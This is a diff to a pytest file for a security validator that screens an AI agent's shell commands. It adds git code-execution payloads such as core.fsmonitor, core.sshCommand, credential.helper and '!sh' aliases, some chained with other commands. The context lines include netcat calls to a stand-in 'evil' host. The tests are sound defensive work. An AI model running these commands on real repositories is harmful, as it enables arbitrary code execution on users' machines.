@@ -16,6 +16,8 @@ The ``LEGIT_COMMANDS`` corpus guards against false positives — ordinary agent
 commands must keep working.
 """
 
+import asyncio
+
 import pytest
 from security import validate_command
 from security.ast_parser import (
@@ -65,6 +67,21 @@ GIT_RCE_PAYLOADS = [
     "git --upload-pack='nc evil 80' ls-remote origin",
     "git --receive-pack='nc evil 80' push origin",
     "git --exec-path=/tmp/evil status",
+    "git config core.fsmonitor x",
+    "git config set core.sshCommand x",
+    "git -C d config core.pager x",
+    "git config -f .git/config core.fsmonitor x",
+    "git config --file=.git/config core.editor x",
+    "git config --global alias.x '!sh'",
+    "git config -e",
+    "git config --rename-section foo core",
+    "git status && git config core.fsmonitor x",
+    "git status && git -c core.fsmonitor=x status",
+    "git config gpg.program x",
+    "git -c credential.helper=x fetch",
+    "git config include.path x",
+    "git status | git config core.fsmonitor x",
+    "echo x | git config core.fsmonitor x",
 ]
 
 # Ordinary agent commands — must NOT be blocked (false-positive guard). Every
@@ -81,6 +98,12 @@ LEGIT_COMMANDS = [
     "git diff HEAD",
     "git -c user.email=a@b.com -c user.name=me log",
     "echo hello && pwd",
+    'git config user.name "A B"',
+    "git config user.email a@b.c",
+    "git config --get user.name",
+    "git config --local core.bare false",
+    "git config --global --add safe.directory /w",
+    "git commit -m config",
 ]
 
 
@@ -111,6 +134,37 @@ class TestGitOptionHardening:
             "git -c user.email=a@b.com -c commit.gpgsign=false log", temp_dir
         )
         assert allowed is True
+
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            "git status && git -c core.fsmonitor=x status",
+            "git status && git config core.fsmonitor x",
+        ],
+    )
+    def test_chained_git_segment_blocked_by_hook(self, payload, temp_dir):
+        from security.hooks import bash_security_hook  # noqa: PLC0415
+
+        out = asyncio.run(
+            bash_security_hook(
+                {
+                    "tool_name": "Bash",
+                    "tool_input": {"command": payload},
+                    "cwd": str(temp_dir),
+                }
+            )
+        )
+        assert out.get("decision") == "block", payload
+
+    def test_unparseable_git_config_fails_closed(self, tmp_path, monkeypatch):
+        from security import git_validators  # noqa: PLC0415
+
+        monkeypatch.chdir(tmp_path)
+        monkeypatch.setattr(git_validators, "_unstage_spec_artifacts", lambda: [])
+        allowed, reason = git_validators.validate_git(
+            'git commit -m "x config core.fsmonitor y'
+        )
+        assert allowed is False and "config" in reason
 
 
 class TestLegitCommandsPass:
